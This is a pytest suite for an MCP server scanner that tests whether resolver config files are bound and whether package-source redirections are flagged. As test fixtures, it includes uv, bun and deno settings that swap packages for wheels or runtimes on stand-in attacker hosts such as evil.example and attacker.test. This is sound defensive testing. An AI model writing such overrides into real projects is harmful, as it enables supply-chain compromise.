"""Every setting of a project resolver file is bound, and the unknown ones are sources."""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from click.testing import CliRunner

from nexus_symbiote.cli import main
from nexus_symbiote.core.aibom import AIBOM
from nexus_symbiote.core.models import MCPServerComponent
from nexus_symbiote.scanners.mcp import (
    SOURCE_BINDING_KEY_ENV,
    STATIC_VALUE_BINDING_PROFILE,
    MCPScanner,
)

KEY = "synthetic-resolver-binding-key-000000000000"
UV_RUN = {
    "command": "uv",
    "args": ["run", "--no-project", "--with", "mcp-server-fetch==2025.1.17", "mcp-server-fetch"],
}
UVX = {"command": "uvx", "args": ["mcp-server-fetch==2025.1.17"]}
BUNX = {"command": "bunx", "args": ["@modelcontextprotocol/server-everything@2025.1.14"]}
DENO = {
    "command": "deno",
    "args": ["run", "-A", "npm:@modelcontextprotocol/server-everything@2025.1.14"],
}
YARN = {"command": "yarn", "args": ["dlx", "left-pad@1.3.0"]}
FAKE_TOKEN = "ghp_" + "e" * 36


def _write(root: Path, config: dict, files: dict[str, str]) -> None:
    root.mkdir(parents=True, exist_ok=True)
    (root / ".mcp.json").write_text(json.dumps({"mcpServers": {"s": config}}))
    for name, content in files.items():
        (root / name).write_bytes(content.encode())


def _server(root: Path, config: dict, files: dict[str, str]) -> MCPServerComponent:
    _write(root, config, files)
    result = MCPScanner().scan(root)
    assert not result.scan_failures, result.scan_failures
    return next(c for c in result.components if isinstance(c, MCPServerComponent))


def _binding(root: Path, config: dict, files: dict[str, str]) -> str:
    return str(_server(root, config, files).properties["static_value_binding"])


def _redirected(server: MCPServerComponent, label: str) -> None:
    assert server.launcher_package is None and server.package_url is None
    assert label in server.properties["package_sources"], server.properties
    assert any(
        r.category == "package_source" and r.severity.value == "medium" for r in server.risks
    )


def _unchanged(server: MCPServerComponent, purl: str) -> None:
    assert server.package_url == purl, server.properties.get("package_sources")
    assert "package_sources" not in server.properties
    assert not any(
        r.category in {"package_source", "launcher_identity", "launch_context"}
        for r in server.risks
    ), server.risks


FETCH = "pkg:pypi/mcp-server-fetch@2025.1.17"
EVERYTHING = "pkg:npm/%40modelcontextprotocol/server-everything@2025.1.14"


@pytest.mark.parametrize(
    "config,path,before,after",
    [
        (UV_RUN, "uv.toml", 'cache-dir = "/var/cache/uv"\n', 'cache-dir = "./.uvcache"\n'),
        (
            UV_RUN,
            "uv.toml",
            'cache-dir = "/var/cache/uv"\n',
            'cache-dir = "/var/cache/uv"\noverride-dependencies = '
            '["mcp-server-fetch @ https://evil.example/mcp_server_fetch-9-py3-none-any.whl"]\n',
        ),
        (UVX, "uv.toml", 'cache-dir = "/var/cache/uv"\n', 'cache-dir = "./.uvcache"\n'),
        (
            UV_RUN,
            "pyproject.toml",
            "[tool.uv]\ncompile-bytecode = true\n",
            "[tool.uv]\ncompile-bytecode = false\n",
        ),
        (
            BUNX,
            "bunfig.toml",
            "[install]\nexact = true\n",
            '[install]\nexact = true\n[install.cache]\ndir = "./.bun-cache"\n',
        ),
        (BUNX, "bunfig.toml", "[install]\nexact = true\n", "[install]\nexact = false\n"),
        (
            DENO,
            "deno.json",
            '{"lock": true}',
            '{"lock": true, "vendor": true, "nodeModulesDir": "manual"}',
        ),
        (DENO, "deno.jsonc", '{"fmt": {"lineWidth": 80}}', '{"fmt": {"lineWidth": 100}}'),
        (YARN, ".yarnrc.yml", "enableGlobalCache: true\n", "enableGlobalCache: false\n"),
        (YARN, ".yarnrc.yml", "nodeLinker: pnp\n", "nodeLinker: node-modules\n"),
    ],
)
def test_every_resolver_file_value_is_in_the_keyed_binding(
    tmp_path, monkeypatch, config, path, before, after
):
    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
    first = _binding(tmp_path, config, {path: before})
    assert first == _binding(tmp_path, config, {path: before})
    assert _binding(tmp_path, config, {path: after}) != first


@pytest.mark.parametrize(
    "config,path,before,after",
    [
        (
            UV_RUN,
            "uv.toml",
            'cache-dir = "/var/cache/uv"\n',
            'cache-dir = "./.uvcache"\noverride-dependencies = '
            '["mcp-server-fetch @ https://evil.example/mcp_server_fetch-9-py3-none-any.whl"]\n',
        ),
        (
            BUNX,
            "bunfig.toml",
            "[install]\nexact = true\n",
            '[install]\nexact = true\n[install.cache]\ndir = "./.bun-cache"\n',
        ),
        (
            DENO,
            "deno.json",
            '{"lock": true}',
            '{"lock": true, "vendor": true, "nodeModulesDir": "manual"}',
        ),
    ],
)
def test_a_redirecting_resolver_edit_fails_diff_and_validation(
    tmp_path, monkeypatch, config, path, before, after
):
    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
    root = tmp_path / "project"
    runner = CliRunner()

    def scan(output: Path) -> None:
        run = runner.invoke(
            main, ["scan", "--no-project-policy", "--report-only", str(root), "-o", str(output)]
        )
        assert run.exit_code == 0, run.output

    _write(root, config, {path: before, "CLAUDE.md": "Fixed instructions.\n"})
    scan(tmp_path / "baseline.json")
    validate = ["validate", "--no-project-policy", str(tmp_path / "baseline.json")]
    assert runner.invoke(main, [*validate, "--project", str(root)]).exit_code == 0
    (root / path).write_text(after)
    scan(tmp_path / "candidate.json")
    diff = runner.invoke(
        main,
        ["diff", str(tmp_path / "baseline.json"), str(tmp_path / "candidate.json")],
    )
    assert diff.exit_code == 1, diff.output
    assert "No changes detected" not in diff.output
    rejected = runner.invoke(main, [*validate, "--project", str(root)])
    assert rejected.exit_code == 1, rejected.output
    assert "Missing or mismatched local component" in rejected.output


@pytest.mark.parametrize(
    "config,path,content,label",
    [
        (UV_RUN, "uv.toml", 'cache-dir = "./.uvcache"\n', "uv.toml:cache-dir=[local]"),
        (UV_RUN, "uv.toml", 'cache-dir = "/var/cache/uv"\n', "uv.toml:cache-dir=[local]"),
        (UV_RUN, "uv.toml", 'cache-dir = ""\n', "uv.toml:cache-dir=[set]"),
        (UVX, "uv.toml", '"cache\\u002ddir" = ".uvcache"\n', "uv.toml:cache-dir=[local]"),
        (
            UV_RUN,
            "pyproject.toml",
            '[project]\nname = "app"\n[tool.uv]\ncache-dir = ".uvcache"\n',
            "pyproject.toml:cache-dir=[local]",
        ),
        (
            UV_RUN,
            "pyproject.toml",
            'tool.uv.cache-dir = ".uvcache"\n',
            "pyproject.toml:cache-dir=[local]",
        ),
        (
            UV_RUN,
            "pyproject.toml",
            '[tool]\nuv = { cache-dir = ".uvcache" }\n',
            "pyproject.toml:cache-dir=[local]",
        ),
        (UV_RUN, "uv.toml", "offline = true\n", "uv.toml:offline=[local]"),
        (UV_RUN, "uv.toml", "no-index = true\n", "uv.toml:no-index=[local]"),
        (UV_RUN, "uv.toml", "native-tls = true\n", "uv.toml:native-tls=[local]"),
        (
            UV_RUN,
            "uv.toml",
            'index-strategy = "unsafe-best-match"\n',
            "uv.toml:index-strategy=[local]",
        ),
        (
            UV_RUN,
            "uv.toml",
            'python-downloads-json-url = "https://python.attacker.test/downloads.json"\n',
            "uv.toml:python-downloads-json-url=https://python.attacker.test",
        ),
        (
            UV_RUN,
            "uv.toml",
            '[[dependency-metadata]]\nname = "mcp-server-fetch"\nversion = "2025.1.17"\n'
            'requires-dist = ["helper @ https://evil.example/helper.whl"]\n',
            "uv.toml:dependency-metadata=https://evil.example",
        ),
        (
            UV_RUN,
            "uv.toml",
            'override-dependencies = ["httpx @ https://evil.example/httpx.whl"]\n',
            "uv.toml:override-dependencies=https://evil.example",
        ),
        (
            BUNX,
            "bunfig.toml",
            '[install.cache]\ndir = "./.bun-cache"\n',
            "bunfig.toml:install.cache.dir=[local]",
        ),
        (
            BUNX,
            "bunfig.toml",
            'install.cache.dir = "./.bun-cache"\n',
            "bunfig.toml:install.cache.dir=[local]",
        ),
        (
            BUNX,
            "bunfig.toml",
            'install = { cache = { dir = "./.bun-cache" } }\n',
            "bunfig.toml:install.cache.dir=[local]",
        ),
        (
            BUNX,
            "bunfig.toml",
            '[install]\nexact = true\ncache.dir = "./.bun-cache"\n',
            "bunfig.toml:install.cache.dir=[local]",
        ),
        (
            BUNX,
            "bunfig.toml",
            '[install]\ncache = "./.bun-cache"\n',
            "bunfig.toml:install.cache=[local]",
        ),
        (
            BUNX,
            "bunfig.toml",
            '[install]\nglobalDir = "./.bun-global"\n',
            "bunfig.toml:install.globalDir=[local]",
        ),
        (DENO, "deno.json", '{"vendor": true}', "deno.json:vendor=[local]"),
        (DENO, "deno.json", '{"nodeModulesDir": "manual"}', "deno.json:nodeModulesDir=[local]"),
        (DENO, "deno.json", '{"nodeModulesDir": "auto"}', "deno.json:nodeModulesDir=[local]"),
        (DENO, "deno.json", '{"nodeModulesDir": true}', "deno.json:nodeModulesDir=[local]"),
        (
            DENO,
            "deno.jsonc",
            '// vendored\n{"\\u0076endor": true,}\n',
            "deno.jsonc:vendor=[local]",
        ),
        (DENO, "deno.json", '{"unstable": ["kv", "byonm"]}', "deno.json:unstable=[local]"),
        (DENO, "deno.json", '{"unstable": "byonm"}', "deno.json:unstable=[local]"),
        # A value of another type is never read as the default or as a list of it.
        (
            BUNX,
            "bunfig.toml",
            '[install]\ncache = "false"\n',
            "bunfig.toml:install.cache=[local]",
        ),
        (DENO, "deno.json", '{"vendor": "false"}', "deno.json:vendor=[local]"),
        (DENO, "deno.json", '{"nodeModulesDir": ["none"]}', "deno.json:nodeModulesDir=[local]"),
        (DENO, "deno.json", '{"unstable": "[\\"kv\\"]"}', "deno.json:unstable=[local]"),
        (UV_RUN, "uv.toml", 'offline = "false"\n', "uv.toml:offline=[local]"),
        (UV_RUN, "uv.toml", "index-strategy = ['first-index']\n", "uv.toml:index-strategy=[local]"),
    ],
)
def test_cache_vendor_node_modules_and_override_settings_are_sources(
    tmp_path, config, path, content, label
):
    _redirected(_server(tmp_path, config, {path: content}), label)


@pytest.mark.parametrize(
    "config,path,content,label",
    [
        (UV_RUN, "uv.toml", 'cache_dir = "./.uvcache"\n', "uv.toml:[other]=[local]"),
        (UV_RUN, "uv.toml", '"Cache-Dir" = "./.uvcache"\n', "uv.toml:[other]=[local]"),
        (UVX, "uv.toml", 'cacheDir = "./.uvcache"\n', "uv.toml:[other]=[local]"),
        (
            UV_RUN,
            "pyproject.toml",
            '[tool.uv]\nfuture-setting = "https://pypi.attacker.test/simple"\n',
            "pyproject.toml:[other]=https://pypi.attacker.test",
        ),
        (BUNX, "bunfig.toml", '[install]\ncacheDir = "./x"\n', "bunfig.toml:[other]=[local]"),
        (
            BUNX,
            "bunfig.toml",
            '[install.cache]\ndirectory = "./x"\n',
            "bunfig.toml:[other]=[local]",
        ),
        (
            BUNX,
            "bunfig.toml",
            '[install.registries]\nacme = "https://npm.attacker.test/"\n',
            "bunfig.toml:[other]=https://npm.attacker.test",
        ),
        (DENO, "deno.json", '{"node_modules_dir": "manual"}', "deno.json:[other]=[local]"),
        (DENO, "deno.json", '{"vendorDir": "./vendor"}', "deno.json:[other]=[local]"),
        (DENO, "deno.json", json.dumps({FAKE_TOKEN: True}), "deno.json:[other]=[local]"),
    ],
)
def test_unknown_resolver_settings_are_sources_named_other(tmp_path, config, path, content, label):
    server = _server(tmp_path, config, {path: content})
    _redirected(server, label)
    assert f"{path}:[other]" in server.properties["resolver_settings"]
    assert FAKE_TOKEN not in server.model_dump_json()


@pytest.mark.parametrize(
    "path,content",
    [
        (
            "uv.toml",
            'override-dependencies = ["mcp-server-fetch @ https://evil.example/x.whl"]\n',
        ),
        ("uv.toml", 'override-dependencies = ["MCP_Server.Fetch[cli]==9.9.9"]\n'),
        ("uv.toml", 'constraint-dependencies = ["mcp-server-fetch==9.9.9"]\n'),
        ("uv.toml", 'build-constraint-dependencies = ["httpx", "mcp-server-fetch<1"]\n'),
        ("uv.toml", 'override-dependencies = ["not a requirement ;;"]\n'),
        ("uv.toml", "override-dependencies = [7]\n"),
        ("uv.toml", 'override-dependencies = "mcp-server-fetch @ https://evil.example/x.whl"\n'),
        ("uv.toml", "override-dependencies = '[\"httpx\"]'\n"),
        (
            "pyproject.toml",
            "[tool.uv]\noverride-dependencies = "
            "[\"mcp-server-fetch==9.9.9 ; sys_platform != 'x'\"]\n",
        ),
    ],
)
@pytest.mark.parametrize("config", [UV_RUN, UVX])
def test_uv_overrides_of_the_launched_package_make_the_identity_unknown(
    tmp_path, config, path, content
):
    _write(tmp_path, config, {path: content})
    result = MCPScanner().scan(tmp_path)
    server = next(c for c in result.components if isinstance(c, MCPServerComponent))
    assert server.package_url is None and server.version_pinned is False
    detail = "replaces or constrains the launched package"
    assert any(
        r.category == "launcher_identity" and r.severity.value == "high" and detail in r.detail
        for r in server.risks
    )
    assert any(detail in gap for gap in result.surfaces_excluded)


def test_overriding_another_package_is_a_source_not_an_identity_change(tmp_path):
    content = 'constraint-dependencies = ["httpx<0.28", "anyio==4.6.0"]\n'
    server = _server(tmp_path, UV_RUN, {"uv.toml": content})
    _redirected(server, "uv.toml:constraint-dependencies=[local]")
    assert server.version_pinned is True
    assert not any(r.category == "launcher_identity" for r in server.risks)


@pytest.mark.parametrize(
    "content",
    [
        'define = { "process.env.REGISTRY" = "\\"https://npm.attacker.test\\"" }\n',
        'jsxImportSource = "npm:evil-runtime"\n',
        '[install.security]\nscanner = "./scanner.ts"\n',
    ],
)
def test_bunfig_settings_that_change_the_running_code_are_launch_context(tmp_path, content):
    server = _server(tmp_path, BUNX, {"bunfig.toml": content})
    assert server.properties["launch_context"]["code_loading_setting"] == 1
    assert any(
        r.category == "launch_context" and r.severity.value == "medium" for r in server.risks
    )


@pytest.mark.parametrize("value", [["../server-everything"], "[]", "../server-everything"])
@pytest.mark.parametrize("key", ["links", "patch"])
def test_deno_local_package_links_make_the_identity_unknown(tmp_path, key, value):
    _write(tmp_path, DENO, {"deno.json": json.dumps({key: value})})
    result = MCPScanner().scan(tmp_path)
    server = next(c for c in result.components if isinstance(c, MCPServerComponent))
    assert server.package_url is None and server.version_pinned is False
    detail = f"deno.json {key} replaces packages with local directories"
    assert any(r.category == "launcher_identity" and detail in r.detail for r in server.risks)


def test_resolver_file_settings_match_their_environment_equivalents(tmp_path):
    from_file = _server(tmp_path / "file", BUNX, {"bunfig.toml": '[install.cache]\ndir = "./c"\n'})
    from_env = _server(tmp_path / "env", {**BUNX, "env": {"BUN_INSTALL_CACHE_DIR": "./c"}}, {})
    for server in (from_file, from_env):
        assert server.package_url is None and server.launcher_package is None
        assert any(r.category == "package_source" for r in server.risks)
    uv_file = _server(tmp_path / "uvfile", UV_RUN, {"uv.toml": 'cache-dir = "./c"\n'})
    uv_env = _server(tmp_path / "uvenv", {**UV_RUN, "env": {"UV_CACHE_DIR": "./c"}}, {})
    assert {r.category for r in uv_file.risks} == {r.category for r in uv_env.risks}


@pytest.mark.parametrize(
    "config,path,content,purl",
    [
        (
            UV_RUN,
            "uv.toml",
            'compile-bytecode = true\nresolution = "highest"\nprerelease = "if-necessary"\n'
            'link-mode = "copy"\npython-preference = "managed"\npython-downloads = "manual"\n'
            "concurrent-downloads = 8\nexclude-newer = 2025-01-01T00:00:00Z\noffline = false\n"
            'no-index = false\nnative-tls = false\nindex-strategy = "first-index"\n'
            'keyring-provider = "disabled"\noverride-dependencies = []\nno-cache = false\n'
            'required-version = ">=0.5"\nno-build-isolation-package = ["flash-attn"]\n'
            '[pip]\nindex-url = "https://pypi.corp.test/simple"\n',
            FETCH,
        ),
        (
            UVX,
            "pyproject.toml",
            '[project]\nname = "app"\nversion = "1.0.0"\ndependencies = ["httpx"]\n'
            '[dependency-groups]\ndev = ["pytest>=8"]\n'
            '[tool.uv]\ndev-dependencies = ["ruff"]\npackage = false\n'
            'default-groups = ["dev"]\nmanaged = true\n'
            '[tool.uv.workspace]\nmembers = ["packages/*"]\n'
            "[tool.uv.sources]\nhelper = { workspace = true }\n"
            "[tool.ruff]\nline-length = 100\n",
            FETCH,
        ),
        (
            BUNX,
            "bunfig.toml",
            'telemetry = false\nlogLevel = "warn"\nsmol = true\n'
            "[install]\nexact = true\nfrozenLockfile = true\nsaveTextLockfile = true\n"
            'linker = "isolated"\nauto = "disable"\nminimumReleaseAge = 259200\n'
            "[install.lockfile]\nsave = true\n"
            "[install.cache]\ndisable = true\n"
            '[test]\npreload = ["./setup.ts"]\ncoverage = true\n'
            "[run]\nbun = true\nsilent = true\n",
            EVERYTHING,
        ),
        (
            DENO,
            "deno.json",
            json.dumps(
                {
                    "$schema": "https://deno.land/x/deno/cli/schemas/config-file.v1.json",
                    "name": "@acme/app",
                    "version": "1.0.0",
                    "exports": "./mod.ts",
                    "lock": True,
                    "tasks": {"dev": "deno run -A main.ts"},
                    "fmt": {"lineWidth": 100},
                    "lint": {"rules": {"tags": ["recommended"]}},
                    "test": {"include": ["tests/"]},
                    "compilerOptions": {"strict": True},
                    "nodeModulesDir": "none",
                    "vendor": False,
                    "unstable": ["kv", "cron"],
                    "links": [],
                    "exclude": ["dist/"],
                    "workspace": ["./packages/app"],
                }
            ),
            EVERYTHING,
        ),
        (DENO, "deno.json", json.dumps({"nodeModulesDir": False}), EVERYTHING),
    ],
)
def test_ordinary_resolver_settings_keep_the_package_identity(
    tmp_path, config, path, content, purl
):
    server = _server(tmp_path, config, {path: content})
    _unchanged(server, purl)
    names = server.properties["resolver_settings"]
    # A sources entry names a package from input, so only a launched package's is named.
    others = 1 if "[tool.uv.sources]" in content else 0
    assert len([name for name in names if name.endswith(":[other]")]) == others, names
    assert len(names) > others


@pytest.mark.parametrize(
    "path,first,second",
    [
        (
            "bunfig.toml",
            '[install.registry]\nurl = "https://registry.npmjs.org/"\ntoken = "fake-token-one"\n',
            '[install.registry]\nurl = "https://registry.npmjs.org/"\ntoken = "fake-token-two"\n',
        ),
        (
            "bunfig.toml",
            '[install.scopes]\nacme = { url = "https://npm.acme.test/", username = "a", '
            'password = "fake-password-one" }\n',
            '[install.scopes]\nacme = { url = "https://npm.acme.test/", username = "b", '
            'password = "fake-password-two" }\n',
        ),
        (
            ".yarnrc.yml",
            "npmAuthToken: fake-token-one\nnpmScopes:\n  acme:\n    npmAuthToken: fake-scope-one\n",
            "npmAuthToken: fake-token-two\nnpmScopes:\n  acme:\n    npmAuthToken: fake-scope-two\n",
        ),
        (
            ".yarnrc.yml",
            "npmRegistries:\n  //npm.acme.test:\n    npmAuthIdent: fake-ident-one\n",
            "npmRegistries:\n  //npm.acme.test:\n    npmAuthIdent: fake-ident-two\n",
        ),
    ],
)
def test_auth_settings_stay_out_of_the_binding(tmp_path, monkeypatch, path, first, second):
    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
    config = BUNX if path == "bunfig.toml" else YARN
    rotated = _server(tmp_path, config, {path: second})
    assert _binding(tmp_path, config, {path: first}) == rotated.properties["static_value_binding"]
    assert "fake-" not in rotated.model_dump_json()


@pytest.mark.parametrize(
    "path,first,second",
    [
        (
            "uv.toml",
            'cache-dir = "/var/cache/uv"\ncompile-bytecode = true\n',
            '# reordered\ncompile-bytecode = true\n\ncache-dir = "/var/cache/uv"  # same\n',
        ),
        (
            "bunfig.toml",
            '[install.cache]\ndir = "/var/cache/bun"\n[install]\nexact = true\n',
            'install.exact = true\ninstall.cache.dir = "/var/cache/bun"\n',
        ),
        (
            "pyproject.toml",
            '[tool.uv]\ncache-dir = "/var/cache/uv"\n[tool.uv.pip]\nquiet = true\n',
            '[tool.uv.pip]\nquiet = true\n[tool.uv]\ncache-dir = "/var/cache/uv"\n',
        ),
    ],
)
def test_toml_layout_and_order_do_not_change_the_binding(
    tmp_path, monkeypatch, path, first, second
):
    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
    config = BUNX if path == "bunfig.toml" else UV_RUN
    assert _binding(tmp_path, config, {path: first}) == _binding(tmp_path, config, {path: second})


@pytest.mark.parametrize(
    "first,second",
    [
        ("exclude-newer = 2025-01-01T00:00:00Z\n", 'exclude-newer = "2025-01-01T00:00:00Z"\n'),
        ("exclude-newer = 2025-01-01T00:00:00Z\n", "exclude-newer = 2025-01-01T00:00:00\n"),
        ("concurrent-downloads = 1\n", "concurrent-downloads = 1.0\n"),
        ("compile-bytecode = true\n", 'compile-bytecode = "true"\n'),
        ('no-binary-package = ["a", "b"]\n', 'no-binary-package = ["a,b"]\n'),
    ],
)
def test_toml_value_types_are_distinguished_in_the_binding(tmp_path, monkeypatch, first, second):
    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
    first_binding = _binding(tmp_path, UV_RUN, {"uv.toml": first})
    assert first_binding != _binding(tmp_path, UV_RUN, {"uv.toml": second})


def test_added_settings_change_the_unkeyed_digest_and_are_unbound_without_a_key(
    tmp_path, monkeypatch
):
    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)
    base = _server(tmp_path, UVX, {"uv.toml": "compile-bytecode = true\n"})
    assert base.properties["resolver_settings"] == ["uv.toml:compile-bytecode"]
    unbound = next(r for r in base.risks if r.category == "completeness")
    assert "project resolver settings" in unbound.detail
    added = _server(tmp_path, UVX, {"uv.toml": "compile-bytecode = true\nlink-mode = 'copy'\n"})
    assert added.properties["static_config_hash"] != base.properties["static_config_hash"]
    changed = _server(tmp_path, UVX, {"uv.toml": "compile-bytecode = false\n"})
    assert changed.properties["static_config_hash"] == base.properties["static_config_hash"]


def test_keyed_binding_profile_is_v4_and_a_v3_record_needs_recollection(tmp_path, monkeypatch):
    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
    assert STATIC_VALUE_BINDING_PROFILE == "nexus-symbiote/mcp-static-values/v4"
    root = tmp_path / "project"
    _write(root, BUNX, {"bunfig.toml": "[install]\nexact = true\n", "CLAUDE.md": "Fixed.\n"})
    output = tmp_path / "baseline.json"
    runner = CliRunner()
    scan = ["scan", "--no-project-policy", "--report-only", str(root), "-o", str(output)]
    assert runner.invoke(main, scan).exit_code == 0
    validate = ["validate", "--no-project-policy", str(output), "--project", str(root)]
    assert runner.invoke(main, validate).exit_code == 0
    bom = AIBOM.load(output)
    server = next(c for c in bom.components if isinstance(c, MCPServerComponent))
    server.properties["static_value_binding_profile"] = "nexus-symbiote/mcp-static-values/v3"
    bom.save(output)
    assert runner.invoke(main, validate).exit_code == 1


def test_a_resolver_value_the_binding_cannot_encode_fails_collection(tmp_path, monkeypatch):
    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
    root = tmp_path / "project"
    _write(root, YARN, {".yarnrc.yml": 'nodeLinker: "\\ud800"\n'})
    result = MCPScanner().scan(root)
    assert ".yarnrc.yml: invalid setting values" in result.scan_failures
    output = tmp_path / "bom.json"
    run = CliRunner().invoke(main, ["scan", "--no-project-policy", str(root), "-o", str(output)])
    assert run.exit_code == 1, run.output
